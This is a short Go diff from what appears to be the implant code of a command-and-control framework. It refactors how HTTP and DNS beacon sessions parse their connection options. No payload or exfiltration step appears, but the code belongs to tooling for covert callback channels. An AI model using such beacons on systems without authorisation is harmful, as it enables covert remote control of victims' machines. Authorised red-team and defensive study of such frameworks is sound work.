@@ -278,9 +278,8 @@ func httpBeacon(uri *url.URL) *Beacon {
 	var err error
 	beacon := &Beacon{
 		Start: func() error {
-			proxyConfig := uri.Query().Get("proxy")
-			timeout := GetPollTimeout()
-			client, err = httpclient.HTTPStartSession(uri.Host, uri.Path, timeout, proxyConfig)
+			opts := httpclient.ParseHTTPOptions(uri)
+			client, err = httpclient.HTTPStartSession(uri.Host, uri.Path, opts)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[beacon] http(s) connection error %s", err)
@@ -312,8 +311,8 @@ func dnsBeacon(uri *url.URL) *Beacon {
 	var err error
 	beacon := &Beacon{
 		Start: func() error {
-			timeout := GetPollTimeout()
-			client, err = dnsclient.DNSStartSession(uri.Host, timeout, timeout)
+			opts := dnsclient.ParseDNSOptions(uri)
+			client, err = dnsclient.DNSStartSession(uri.Host, opts)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[beacon] http(s) connection error %s", err)
